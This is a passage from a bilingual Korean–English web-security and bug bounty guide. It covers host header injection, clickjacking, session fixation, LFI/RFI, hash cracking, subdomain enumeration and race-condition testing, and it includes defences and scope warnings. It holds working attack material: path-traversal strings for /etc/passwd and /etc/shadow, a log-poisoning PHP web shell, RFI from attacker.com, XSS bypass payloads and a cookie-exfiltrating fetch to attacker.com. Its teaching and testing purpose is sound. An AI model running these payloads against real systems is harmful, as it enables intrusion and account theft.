# S3 버킷 탈취
# 1. 버킷 이름과 동일한 S3 버킷 생성 (같은 리전)
# 2. 피싱 페이지 업로드
```

---

## 9. Host Header Injection

### 공격 원리
```
HTTP Host 헤더를 서버가 그대로 신뢰하여 처리할 때 발생
→ 비밀번호 재설정 링크, 캐시 포이즈닝, SSRF 등에 악용 가능
```

### Host Header Injection 기법

Host 헤더 인젝션으로 비밀번호 재설정 링크를 공격자 도메인으로 변조합니다. 이메일에 포함된 링크가 공격자 서버를 가리키게 됩니다.

```http
# 1. 비밀번호 재설정 링크 변조
POST /reset-password HTTP/1.1
Host: attacker.com         ← 변조

이메일로 발송되는 링크:
https://attacker.com/reset?token=abc123  ← 공격자 도메인 포함

# 2. X-Forwarded-Host 사용
POST /reset-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com   ← 프록시 헤더 악용

# 3. 포트 번호 주입
Host: target.com:@attacker.com

# 4. 서브도메인 추가
Host: attacker.com.target.com

# 5. 중복 Host 헤더
Host: target.com
Host: attacker.com   ← 두 번째 Host가 우선 처리될 수 있음
```

### 캐시 포이즈닝 (Host Header → Web Cache Poisoning)

Host 헤더를 통한 웹 캐시 포이즈닝 공격입니다. CDN이 변조된 응답을 캐시하면 다른 사용자도 피해를 입는 증폭 효과가 있습니다.

```bash
# CDN/리버스 프록시가 Host 헤더를 응답에 반영하면서 캐시할 때
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>

# 응답이 캐시되면 → 다른 사용자도 XSS 영향을 받음
```

### Host Header Injection 방어

허용된 호스트 화이트리스트로 Host 헤더 인젝션을 방어합니다. 비밀번호 재설정 등 링크 생성 시 반드시 검증이 필요합니다.

```python
# Flask: 허용된 호스트 화이트리스트
ALLOWED_HOSTS = ['target.com', 'www.target.com']

@app.before_request
def check_host():
    if request.host not in ALLOWED_HOSTS:
        abort(400)

# Django: ALLOWED_HOSTS 설정
ALLOWED_HOSTS = ['target.com', 'www.target.com']

# 비밀번호 재설정 URL을 환경변수로 하드코딩
RESET_BASE_URL = 'https://target.com/reset'
```

---

## 10. Clickjacking

### 공격 원리
```
피해자 사이트를 투명한 iframe으로 겹쳐 놓고
사용자가 자신도 모르게 클릭하도록 유도

공격 흐름:
1. 공격자 → 악성 페이지 제작
2. 페이지에 target.com을 투명 iframe으로 삽입
3. 피해자를 악성 페이지로 유인
4. 피해자가 버튼을 누르면 실제로 target.com의 동작 수행
   (송금, 설정 변경, 계정 삭제 등)
```

### Clickjacking PoC

Clickjacking 취약점을 증명하는 PoC 페이지입니다. X-Frame-Options 또는 CSP frame-ancestors 헤더가 없는 페이지를 iframe으로 삽입하여 클릭을 유도합니다.

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    #target-frame {
      opacity: 0.0;       /* 완전 투명 (실제 공격) */
      /* opacity: 0.5;    시연용 반투명 */
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 2;
    }
    #decoy-content {
      position: absolute;
      top: 100px;
      left: 200px;
      z-index: 1;
      font-size: 24px;
    }
  </style>
</head>
<body>
  <!-- 피해자에게 보이는 가짜 버튼 -->
  <div id="decoy-content">
    <h2>무료 경품 받기!</h2>
    <button style="padding:20px;font-size:20px">클릭하세요!</button>
  </div>
  
  <!-- 투명하게 겹친 실제 타겟 사이트 -->
  <iframe id="target-frame"
          src="https://target.com/account/delete"
          scrolling="no">
  </iframe>
</body>
</html>
```

### Clickjacking 탐지

X-Frame-Options와 Content-Security-Policy frame-ancestors 헤더 설정을 점검합니다. 두 헤더가 모두 없으면 Clickjacking에 취약합니다.

```bash
# X-Frame-Options 헤더 확인
curl -I https://target.com | grep -i "x-frame\|frame-ancestors"

# 취약한 응답: 헤더 없음 또는
X-Frame-Options: ALLOWALL

# 안전한 응답
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
```

### Clickjacking 방어

응답 헤더에 X-Frame-Options와 CSP frame-ancestors를 추가하여 Clickjacking을 방어합니다.

```http
# 서버 응답 헤더 추가
X-Frame-Options: DENY          # 모든 사이트에서 iframe 금지
X-Frame-Options: SAMEORIGIN    # 동일 도메인만 iframe 허용

# 더 유연한 CSP 방식 (권장)
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

```javascript
// Frame busting (구식, 권장하지 않음)
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

---

## 11. Session Fixation (세션 고정)

### 공격 원리
```
1. 공격자 → 자신의 세션 ID 확보
2. 공격자 → 피해자에게 해당 세션 ID를 사용하도록 강제
3. 피해자 → 해당 세션 ID로 로그인
4. 공격자 → 같은 세션 ID로 피해자 계정에 접근
```

### Session Fixation 시나리오
```
취약한 플로우:
1. 미인증 사용자에게 세션 발급: PHPSESSID=ATTACKER_KNOWN_ID
2. URL 파라미터로 세션 전달:
   http://target.com/login?PHPSESSID=fixed_session_id
3. 피해자가 해당 URL로 로그인 완료
4. 서버가 로그인 후 세션 ID를 재발급하지 않음
5. 공격자가 ATTACKER_KNOWN_ID로 피해자 계정 접근
```

### 탐지 방법
```bash
# 1. 로그인 전후 세션 ID 비교
# Before login:
Set-Cookie: session=BEFORE_LOGIN_ID

# After login:
Set-Cookie: session=BEFORE_LOGIN_ID  ← 세션 ID가 동일 → 취약!
# 안전: Set-Cookie: session=AFTER_LOGIN_NEW_ID ← 다른 ID 발급

# 2. URL 파라미터로 세션 수락 여부 테스트
GET /login?PHPSESSID=test123 HTTP/1.1
# 로그인 후 test123이 유지되면 → Session Fixation 취약
```

### Session Fixation 방어

PHP에서 로그인 성공 후 session_regenerate_id()로 세션 ID를 재생성합니다. 이전 세션 ID를 무효화하여 세션 고정 공격을 차단합니다.

```php
// PHP: 로그인 성공 후 반드시 세션 재생성
session_start();
// ... 로그인 검증 ...
if (login_successful) {
    session_regenerate_id(true);  // 새 세션 ID 발급, 이전 세션 삭제
    $_SESSION['user'] = $user_id;
}
```

---

## 12. LFI / RFI (파일 인클루전 취약점)

### LFI (Local File Inclusion)

LFI(Local File Inclusion) 공격으로 서버의 내부 파일을 읽습니다. /etc/passwd, 설정 파일, 로그 파일을 포함시켜 민감한 정보를 탈취합니다.

```bash
# 기본 LFI
http://target.com/?page=../../../etc/passwd
http://target.com/?file=../../../../etc/shadow

# 인코딩 우회
http://target.com/?page=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
http://target.com/?page=....//....//etc/passwd   (중복 슬래시 필터 우회)

# Null byte 우회 (PHP 5.3 이하)
http://target.com/?page=../../../etc/passwd%00
http://target.com/?page=../../../etc/passwd%00.jpg

# 경로 잘라내기 (Path Truncation — PHP 특유)
http://target.com/?page=../../../etc/passwd.......................

# 타겟 파일 목록
/etc/passwd          (사용자 계정 정보)
/etc/hosts           (호스트 파일)
/etc/ssh/sshd_config (SSH 설정)
/proc/self/environ   (환경 변수 — PHP 코드 삽입 가능)
/var/log/apache2/access.log   (로그 포이즈닝 대상)
/var/log/nginx/access.log
/proc/self/fd/2      (stderr)
/var/mail/www-data
```

### LFI → RCE (Log Poisoning)

LFI(Local File Inclusion) 공격으로 서버의 내부 파일을 읽습니다. /etc/passwd, 설정 파일, 로그 파일을 포함시켜 민감한 정보를 탈취합니다.

```bash
# 1단계: 로그 파일에 PHP 코드 삽입
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2단계: LFI로 로그 파일 실행
http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id

# PHP Session 파일 인젝션
# PHP 세션 파일 위치: /tmp/sess_[SESSION_ID]
# 세션에 PHP 코드 저장 후 LFI로 실행
```

### RFI (Remote File Inclusion)

RFI(Remote File Inclusion)로 원격 서버의 악성 스크립트를 포함시킵니다. PHP allow_url_include 설정이 켜진 환경에서만 동작합니다.

```bash
# 기본 RFI (allow_url_include=On 설정 시)
http://target.com/?page=http://attacker.com/shell.php
http://target.com/?page=ftp://attacker.com/shell.php

# attacker.com/shell.php 내용
<?php system($_GET['cmd']); ?>

# SMB를 통한 RFI (Windows)
http://target.com/?page=\\attacker.com\share\shell.php

# Data URI를 이용한 LFI/RFI 우회
http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### LFI/RFI 방어
```php
// PHP: 화이트리스트 방식
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die('Invalid page');
}

include('pages/' . $page . '.php');

// realpath()로 경로 탐색 방지
$base = realpath('/var/www/html/pages/');
$file = realpath($base . '/' . $page . '.php');

if (strpos($file, $base) !== 0) {
    die('Path traversal detected!');
}

// PHP 설정
// allow_url_include = Off  (RFI 차단)
// allow_url_fopen = Off    (원격 파일 차단)
```

---

## 13. 패스워드 크래킹 기법

### 오프라인 크래킹 도구

Hashcat으로 오프라인 해시 크래킹을 수행합니다. GPU 가속을 활용하여 초당 수십억 회의 해시를 계산할 수 있습니다.

```bash
# Hashcat — GPU 기반 고속 크래킹
# MD5 크래킹
hashcat -a 0 -m 0 hashes.txt wordlist.txt

# SHA-256
hashcat -a 0 -m 1400 hashes.txt wordlist.txt

# bcrypt ($2a$)
hashcat -a 0 -m 3200 hashes.txt wordlist.txt

# NTLM (Windows 해시)
hashcat -a 0 -m 1000 ntlm_hashes.txt wordlist.txt

# 규칙 기반 (변형 적용)
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# 브루트포스 (마스크 어택)
hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a  (8자 모든 문자)
hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d       (6자리 숫자)

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
john --format=md5 hashes.txt --wordlist=rockyou.txt
john --rules --wordlist=wordlist.txt hashes.txt  # 규칙 적용
```

### 해시 식별

hashid 도구로 해시 문자열의 알고리즘 유형을 자동으로 식별합니다. MD5, SHA-1, bcrypt 등 다양한 해시 형식을 구분할 수 있습니다.

```bash
# hashid로 해시 유형 식별
hashid 5f4dcc3b5aa765d61d8327deb882cf99
# → MD5, Domain Cached Credentials

# hash-identifier
python3 hash-identifier.py

# 주요 해시 형식
$1$   → MD5 (Linux)
$2a$  → bcrypt
$5$   → SHA-256 (Linux)
$6$   → SHA-512 (Linux)
$y$   → yescrypt
NTLM  → aad3b435b51404eeaad3b435b51404ee:hash (Windows)
```

---

<a name="english"></a>

# Bug Bounty Methodology — From Beginner to High Severity

## 1. What is Bug Bounty?

```
A program where companies pay rewards to external researchers who discover
vulnerabilities in their services.

Benefits:
  Researchers → Legally apply hacking skills in real scenarios + earn money
  Companies   → Discover vulnerabilities that internal teams often miss

Major Platforms:
  HackerOne   : hackerone.com  (largest platform, Meta, Twitter, Uber, etc.)
  Bugcrowd    : bugcrowd.com   (NASA, Mastercard, etc.)
  Intigriti   : intigriti.com  (Europe-focused)
  Synack       : synack.com    (invite-only, for advanced researchers)
  Private Programs: Google VRP, Microsoft MSRC, Apple Security Bounty
```

---

## 2. Getting Started on Each Platform

### Getting Started on HackerOne
```
1. Sign up at hackerone.com
2. Complete Hacker101 CTF (free training + point accumulation)
   → Accumulate points to receive private program invitations
3. Start with public programs → Check scope first
4. Build Reputation → Gain access to private programs

Recommended first targets:
  - Programs with relatively broad scope
  - Large enterprises with many assets (many subdomains)
  - Long-running but active programs
```

### Reward Guidelines (Reference)
```
Critical  (CVSS 9.0-10.0) : $5,000 ~ $50,000+
High      (CVSS 7.0-8.9)  : $1,000 ~ $10,000
Medium    (CVSS 4.0-6.9)  : $200  ~ $2,000
Low       (CVSS 0.1-3.9)  : $50   ~ $500
Informational             : Usually no reward, acknowledgment only
```

---

## 3. Reconnaissance (Recon) — Asset Discovery

### 3-1. Subdomain Enumeration

A Python script for enumerating subdomains. Combines Subfinder, Amass results, and DNS brute-force to maximize attack surface discovery.

```python
#!/usr/bin/env python3
"""
Bug Bounty Subdomain Enumeration Automation Pipeline
Requirements: pip install requests dnspython aiohttp
External binaries (optional): subfinder, amass, httpx
"""

from __future__ import annotations

import argparse
import asyncio
import json
import subprocess
import sys
import textwrap
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

import requests


# ── crt.sh ───────────────────────────────────────────────────────────────────

def crtsh_enum(domain: str) -> set[str]:
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    try:
        data = requests.get(url, timeout=20).json()
        subs: set[str] = set()
        for entry in data:
            for name in entry.get("name_value", "").splitlines():
                name = name.strip().lstrip("*.")
                if name.endswith(domain) and " " not in name:
                    subs.add(name)
        return subs
    except Exception as exc:
        print(f"[!] crt.sh: {exc}")
        return set()


def subfinder_enum(domain: str) -> set[str]:
    try:
        out = subprocess.check_output(
            ["subfinder", "-d", domain, "-all", "-silent"],
            stderr=subprocess.DEVNULL, timeout=120,
        )
        return {l.strip() for l in out.decode().splitlines() if l.strip()}
    except FileNotFoundError:
        print("[!] subfinder not found")
        return set()
    except Exception:
        return set()


def amass_enum(domain: str, passive: bool = True) -> set[str]:
    cmd = ["amass", "enum", "-d", domain] + (["-passive"] if passive else [])
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=300)
        return {l.strip() for l in out.decode().splitlines() if l.strip()}
    except FileNotFoundError:
        print("[!] amass not found")
        return set()
    except Exception:
        return set()


# ── DNS Resolution ────────────────────────────────────────────────────────────

def resolve_a(subdomain: str) -> Optional[list[str]]:
    try:
        import dns.resolver
        r = dns.resolver.Resolver()
        r.timeout = r.lifetime = 3
        return [str(a) for a in r.resolve(subdomain, "A")]
    except Exception:
        return None


# ── HTTP Liveness Check ───────────────────────────────────────────────────────

def check_http(subdomain: str) -> Optional[dict]:
    """Check HTTP/HTTPS liveness and collect basic information."""
    for scheme in ("https", "http"):
        url = f"{scheme}://{subdomain}"
        try:
            resp = requests.get(url, timeout=8, allow_redirects=True,
                                headers={"User-Agent": "Mozilla/5.0"}, verify=False)
            server = resp.headers.get("Server", "")
            powered = resp.headers.get("X-Powered-By", "")
            title_start = resp.text.find("<title>")
            title_end = resp.text.find("</title>")
            title = resp.text[title_start + 7:title_end].strip() if title_start != -1 else ""
            return {
                "url": resp.url,
                "status": resp.status_code,
                "title": title[:80],
                "server": server,
                "powered_by": powered,
                "content_length": len(resp.content),
            }
        except Exception:
            continue
    return None


# ── Subdomain Takeover Detection ──────────────────────────────────────────────

TAKEOVER_FINGERPRINTS = {
    "github.io": "There isn't a GitHub Pages site here",
    "s3.amazonaws.com": "NoSuchBucket",
    "herokuapp.com": "No such app",
    "azurewebsites.net": "404 Web Site not found",
    "cloudfront.net": "The request could not be satisfied",
    "ghost.io": "The thing you were looking for is no longer here",
    "zendesk.com": "Help Center Closed",
    "shopify.com": "Sorry, this shop is currently unavailable",
    "fastly.net": "Fastly error: unknown domain",
}


def check_takeover(subdomain: str) -> Optional[str]:
    """Check if CNAME points to an unregistered external service."""
    try:
        import dns.resolver
        answers = dns.resolver.resolve(subdomain, "CNAME")
        cname = str(answers[0].target).rstrip(".")
        for service, fingerprint in TAKEOVER_FINGERPRINTS.items():
            if service in cname:
                try:
                    resp = requests.get(f"https://{subdomain}", timeout=8, verify=False)
                    if fingerprint.lower() in resp.text.lower():
                        return f"TAKEOVER possible: {cname} ({service})"
                except Exception:
                    pass
    except Exception:
        pass
    return None


# ── Result Management ─────────────────────────────────────────────────────────

@dataclass
class SubInfo:
    subdomain: str
    ips: list[str] = field(default_factory=list)
    http_info: Optional[dict] = None
    takeover: Optional[str] = None

    @property
    def alive(self) -> bool:
        return self.http_info is not None


def run_pipeline(
    domain: str,
    use_amass: bool = False,
    check_alive: bool = True,
    check_takeovers: bool = True,
    workers: int = 30,
) -> list[SubInfo]:
    all_subs: set[str] = set()

    print("[*] Enumerating via crt.sh...")
    all_subs |= crtsh_enum(domain)
    print(f"    crt.sh: {len(all_subs)} results")

    print("[*] Running subfinder...")
    sf = subfinder_enum(domain)
    all_subs |= sf
    print(f"    subfinder: {len(sf)} results | total: {len(all_subs)}")

    if use_amass:
        print("[*] Running amass (slow)...")
        am = amass_enum(domain)
        all_subs |= am
        print(f"    amass: {len(am)} results | total: {len(all_subs)}")

    print(f"\n[+] After deduplication: {len(all_subs)} subdomains")

    results: list[SubInfo] = []

    # DNS resolution
    try:
        import dns.resolver  # noqa
        print(f"[*] Resolving DNS ({workers} workers)...")
        with ThreadPoolExecutor(max_workers=workers) as pool:
            future_map = {pool.submit(resolve_a, s): s for s in sorted(all_subs)}
            for future in as_completed(future_map):
                sub = future_map[future]
                ips = future.result() or []
                results.append(SubInfo(subdomain=sub, ips=ips))
    except ImportError:
        results = [SubInfo(subdomain=s) for s in sorted(all_subs)]

    if check_alive:
        print(f"[*] Checking HTTP liveness ({workers} workers)...")
        import urllib3
        urllib3.disable_warnings()
        with ThreadPoolExecutor(max_workers=workers) as pool:
            future_map = {pool.submit(check_http, r.subdomain): r for r in results}
            for future in as_completed(future_map):
                rec = future_map[future]
                rec.http_info = future.result()

    if check_takeovers:
        print("[*] Checking for subdomain takeover vulnerabilities...")
        with ThreadPoolExecutor(max_workers=20) as pool:
            future_map = {pool.submit(check_takeover, r.subdomain): r for r in results}
            for future in as_completed(future_map):
                rec = future_map[future]
                rec.takeover = future.result()

    return sorted(results, key=lambda r: (not r.alive, r.subdomain))


def save_results(results: list[SubInfo], out_dir: Path) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)

    (out_dir / "all.txt").write_text(
        "\n".join(r.subdomain for r in results), encoding="utf-8"
    )
    alive = [r for r in results if r.alive]
    (out_dir / "alive.txt").write_text(
        "\n".join(r.subdomain for r in alive), encoding="utf-8"
    )
    takeovers = [r for r in results if r.takeover]
    if takeovers:
        (out_dir / "takeovers.txt").write_text(
            "\n".join(f"{r.subdomain}: {r.takeover}" for r in takeovers),
            encoding="utf-8",
        )
        print(f"\n[!] Takeover candidates: {len(takeovers)} → {out_dir}/takeovers.txt")

    json_data = [
        {
            "subdomain": r.subdomain,
            "ips": r.ips,
            "alive": r.alive,
            "http": r.http_info,
            "takeover": r.takeover,
        }
        for r in results
    ]
    (out_dir / "results.json").write_text(
        json.dumps(json_data, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print(f"[+] Saved: {out_dir}/ | total: {len(results)} | alive: {len(alive)}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Bug Bounty Subdomain Enumeration Automation Pipeline",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            Examples:
              python subdomain_pipeline.py -d target.com
              python subdomain_pipeline.py -d target.com --amass --no-takeover
              python subdomain_pipeline.py -d target.com -o ./recon/ -w 50
            """
        ),
    )
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("--amass", action="store_true", help="include amass (slow)")
    parser.add_argument("--no-alive", action="store_true", help="skip HTTP liveness check")
    parser.add_argument("--no-takeover", action="store_true", help="skip takeover check")
    parser.add_argument("-w", "--workers", type=int, default=30)
    parser.add_argument("-o", "--output", type=Path, default=None)
    args = parser.parse_args()

    out_dir = args.output or Path(f"recon_{args.domain}")
    results = run_pipeline(
        domain=args.domain,
        use_amass=args.amass,
        check_alive=not args.no_alive,
        check_takeovers=not args.no_takeover,
        workers=args.workers,
    )

    for r in results[:20]:
        status = f"[{r.http_info['status']}] {r.http_info['title'][:40]}" if r.alive else "[dead]"
        to = f" !! {r.takeover}" if r.takeover else ""
        print(f"  {r.subdomain:<50} {status}{to}")
    if len(results) > 20:
        print(f"  ... and {len(results) - 20} more")

    save_results(results, out_dir)


if __name__ == "__main__":
    main()
```

### 3-2. URL/Parameter Collection

```bash
# waybackurls (URLs from web archives)
echo "target.com" | waybackurls | tee wayback_urls.txt

# gau (multiple sources)
gau target.com | tee gau_urls.txt

# katana (crawler)
katana -u https://target.com -d 5 -o katana_urls.txt

# Extract parameters only
cat wayback_urls.txt gau_urls.txt | grep "?" | qsreplace FUZZ | sort -u > params.txt

# Extract endpoints from JS files
cat live_subs.txt | getJS | grep "\.js$" | xargs -I{} sh -c 'curl -s {} | python3 -m jsbeautifier | grep -E "api|endpoint|route|path"'
```

### 3-3. Technology Stack Identification

Use whatweb to identify the technology stack of a target website. CMS, framework, and server software information helps research known vulnerabilities for those technologies.

```bash
# whatweb
whatweb https://target.com -a 3

# wappalyzer CLI
npx wappalyzer https://target.com

# nuclei technology detection
nuclei -u https://target.com -t technologies/ -o tech.txt

# HTTP response header analysis
curl -I https://target.com 2>/dev/null | grep -E "Server|X-Powered|X-Framework|Via"
```

---

## 4. Vulnerability Discovery Strategy

### 4-1. OWASP Top 10 Checklist

```
Quick checks for each asset:

□ Broken Access Control
  - Direct access to /admin, /dashboard, /api/users/{id}
  - Replace user IDs (IDOR: Insecure Direct Object Reference)
  - Access privileged functions with a regular account

□ SQL Injection
  - Insert ' in parameters → check for errors
  - Sort/search parameters (ORDER BY, search terms)
  - JSON parameters, headers (X-Forwarded-For, User-Agent)

□ XSS (Cross-Site Scripting)
  - Search terms, comments, profile names, error messages
  - DOM-based: URL fragment (#), location.hash
  - Filter bypass: SVG, event handlers, base64

□ Authentication/Session Vulnerabilities
  - Password reset logic (token reuse, predictable tokens)
  - 2FA bypass (race condition, reuse)
  - JWT: alg:none, HS256→RS256 confusion, secret key brute force

□ SSRF
  - Features that accept URL input (thumbnails, webhooks, PDF generation)
  - http://169.254.169.254/ cloud metadata
  - Internal network scanning

□ File Upload
  - Content-Type tampering, extension filter bypass
  - Guess upload path → execute web shell

□ IDOR (Broken Access Control detail)
  - Change numeric ID to another number
  - Determine where UUIDs are leaked
  - API endpoints: GET /api/orders/12345
```

### 4-2. IDOR — Most Common Bug Bounty Vulnerability

```
IDOR (Insecure Direct Object Reference):
A vulnerability where another user's resources can be accessed directly.

Discovery method:
1. Create 2 accounts (Account A, Account B)
2. Log in as Account A → find your resource URL
   Example: GET /api/v1/users/1001/profile
3. Access Account A's URL using Account B's session
   → If accessible, it's IDOR!

Good places to look:
- Profile edit/view
- Order history, payment information
- File downloads
- API endpoints (numeric ID, UUID)
- Email inbox

Automation:
# Autorize (Burp Suite extension)
# Set up two sessions → automatically check authorization for every request
```

### 4-3. XSS — Filter Bypass Strategies

```
Basic testing:
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

Filter bypass:
# When HTML tags are filtered
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<video autoplay onloadstart=alert(1) src=x>

# When 'script' keyword is filtered
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg><use href="data:image/svg+xml;base64,...#x"/></svg>

# XSS firewall bypass
<scRiPt>alert(1)</scRiPt>
<script/x>alert(1)</script>
<script>/*</script><script>*/alert(1)</script>

# DOM XSS detection
# Use Burp DOM Invader
# Inject canary strings and track through JS source
```

### 4-4. Password Reset Vulnerabilities

```
Vulnerable patterns:

[1] Token reuse
   - Can you reset the password again using the old token after resetting?

[2] Non-expiring tokens
   - Old tokens that never expire

[3] Race condition
   - Multiple simultaneous reset requests → same token on multiple accounts?

[4] Host Header Injection
   POST /reset-password HTTP/1.1
   Host: attacker.com
   → Email sends link to attacker.com

[5] Predictable tokens
   - Time-based (timestamp MD5)
   - User ID-based
```

---

## 5. Burp Suite Bug Bounty Configuration

### 5-1. Essential Extension Plugins

```
Install from BApp Store:

1. Autorize          → Automate IDOR/authorization checks
2. Param Miner       → Auto-discover hidden parameters
3. Retire.js         → Detect vulnerable JS libraries
4. J2EEScan          → Java-specific vulnerabilities
5. Active Scan++     → Enhanced active scanning
6. Reflected Parameters → Track reflected parameters
7. Error Message Checks → Information leakage in error messages
8. Software Vulnerability Scanner → CVE mapping
9. Turbo Intruder    → High-speed brute forcer (race conditions)
10. Logger++         → Log all requests
```

### 5-2. Scope Configuration

Always verify the exact scope of a bug bounty program before testing. Testing out-of-scope systems can result in legal issues. Most platforms clearly distinguish In-scope from Out-of-scope targets.

```
Target → Scope settings:
1. Add → Add target domain
2. Subdomain wildcard: .*\.target\.com$
3. Restrict Spider and Scanner to in-scope only

Important: Never send requests outside scope!
→ Violates HackerOne rules → Risk of account suspension
```

### 5-3. Race Condition Testing with Turbo Intruder

A Turbo Intruder script for exploiting race condition vulnerabilities. Tests concurrent request handling errors such as duplicate coupon use and overdraft.

```python
# race_condition_coupon.py — Turbo Intruder script
# Tests duplicate coupon use / duplicate point accumulation
#
# Usage: Select request in Burp Suite Repeater
#        Extensions > Turbo Intruder > Send to Turbo Intruder
#        Paste this script and click Attack
#
# gate method: queues all requests then sends them simultaneously (HTTP/1 pipeline)

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,   # concurrent connections (higher = more race effect)
        requestsPerConnection=1,
        pipeline=False,             # set True for HTTP/2 environments
        engine=Engine.THREADED,
    )

    # gate method: queue all requests then release simultaneously
    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=20)


def handleResponse(req, interesting):
    # Add only successful responses (200, "success", "applied", etc.) to the table
    if req.status == 200 and any(
        kw in req.response.lower()
        for kw in ('success', 'applied', 'redeemed', 'credited', 'ok')
    ):
        table.add(req)
```

```python
#!/usr/bin/env python3
"""
Race Condition Test — standalone version based on requests
Requirements: pip install requests
"""

from __future__ import annotations

import argparse
import json
import sys
import textwrap
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

import requests


def race_test(
    url: str,
    method: str = "POST",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    count: int = 30,
    workers: int = 30,
    success_codes: list[int] | None = None,
    success_keywords: list[str] | None = None,
) -> list[dict[str, Any]]:
    """Send concurrent requests to check for race condition vulnerabilities."""

    success_codes = success_codes or [200, 201]
    success_keywords = success_keywords or ["success", "ok", "applied", "credited"]
    default_headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    if headers:
        default_headers.update(headers)

    wins: list[dict[str, Any]] = []

    def send_request(idx: int) -> dict[str, Any]:
        try:
            kwargs: dict[str, Any] = {
                "headers": default_headers,
                "timeout": 15,
                "verify": False,
            }
            if body:
                kwargs["data"] = body
            resp = getattr(requests, method.lower())(url, **kwargs)
            text_lower = resp.text.lower()
            hit = resp.status_code in success_codes and any(
                kw in text_lower for kw in success_keywords
            )
            return {
                "idx": idx,
                "status": resp.status_code,
                "length": len(resp.content),
                "time_ms": int(resp.elapsed.total_seconds() * 1000),
                "hit": hit,
                "snippet": resp.text[:100],
            }
        except requests.RequestException as exc:
            return {"idx": idx, "error": str(exc), "hit": False}

    print(f"[*] Race condition test: {count} concurrent requests → {url}")
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(send_request, i) for i in range(count)]
        for future in as_completed(futures):
            result = future.result()
            if result.get("hit"):
                wins.append(result)

    return wins


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Race condition vulnerability test",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            Examples:
              # Test duplicate coupon application
              python race_test.py -u https://target.com/api/coupon/apply \\
                  -X POST -d '{"code":"SAVE10"}' \\
                  -H 'Authorization: Bearer TOKEN' --count 30

              # OTP brute-force race
              python race_test.py -u https://target.com/api/verify-otp \\
                  -X POST -d '{"otp":"123456"}' --count 20
            """
        ),
    )
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-X", "--method", default="POST")
    parser.add_argument("-d", "--data", default=None, help="request body")
    parser.add_argument(
        "-H", "--header", action="append", default=[],
        metavar="KEY:VALUE", help="additional headers (can be used multiple times)",
    )
    parser.add_argument("--count", type=int, default=30, help="number of concurrent requests")
    parser.add_argument("--workers", type=int, default=30)
    parser.add_argument(
        "--keywords", nargs="+",
        default=["success", "ok", "applied", "credited"],
        help="success keywords",
    )
    args = parser.parse_args()

    headers: dict[str, str] = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    import urllib3
    urllib3.disable_warnings()

    wins = race_test(
        url=args.url,
        method=args.method,
        headers=headers or None,
        body=args.data,
        count=args.count,
        workers=args.workers,
        success_keywords=args.keywords,
    )

    print(f"\n[+] Successful responses: {len(wins)} / {args.count}")
    if len(wins) > 1:
        print("[!] Suspected race condition! Multiple successful responses detected.")
        for w in wins:
            print(f"    [{w['idx']}] {w.get('status')} | {w.get('length')}B | {w.get('snippet', '')[:60]}")
    elif len(wins) == 0:
        print("[*] Race condition not detected — try more concurrent requests or different endpoints")
    else:
        print("[*] Single success — normal behavior")


if __name__ == "__main__":
    main()
```

---

## 6. Report Writing — How to Maximize Acceptance

### 6-1. Good Report Structure

Standard structure for a bug bounty report. Clearly describing the vulnerability summary, reproduction steps, impact, PoC, and fix recommendations leads to higher rewards.

```markdown
## Vulnerability Summary
[Vulnerability Type] in [Component] — [One-line impact summary]
Example: Stored XSS in /profile/bio allows Session Hijacking

## Severity: High (CVSS 3.1: 8.1)

## Impact
- Attacker can steal victim's session cookie to take over their account
- If an admin account is compromised, the entire system is at risk

## Vulnerable Endpoint
POST /api/v1/profile/update
Parameter: bio

## Steps to Reproduce
1. Log in as the victim account
2. Edit profile → Enter the following in the bio field:
   <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
3. Save changes
4. When another user visits the profile, cookies are automatically sent

## PoC
[Attach screenshot or video]
Cookie capture server log:
[2024-01-15 10:23:45] GET /?c=sessionid=abc123def456

## Remediation
Encode HTML special characters when saving the bio field:
